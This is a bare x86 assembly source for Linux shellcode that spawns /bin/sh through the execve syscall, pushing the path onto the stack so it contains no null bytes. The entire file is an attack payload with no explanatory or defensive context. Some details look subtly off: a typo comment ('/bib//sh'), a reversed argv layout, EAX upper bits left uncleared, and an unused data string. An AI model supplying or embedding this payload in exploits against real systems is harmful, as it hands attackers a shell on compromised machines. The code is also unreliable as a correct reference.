;[BITS 32]

section .data
str: db '/bin/sh'

section .text
global _start
_start:

;	/bib//sh -> 2f62696e2f2f7368
	xor	edx, edx
	push	edx
	push	0x68732f2f
	push    0x6e69622f
	mov	ebx, esp

	; make stack to double pointer
	push	ebx		; '/bin/sh' string
	push	edx		; null
	mov	ecx, esp
	mov	al, 0xb; syscall number
	int 	80h

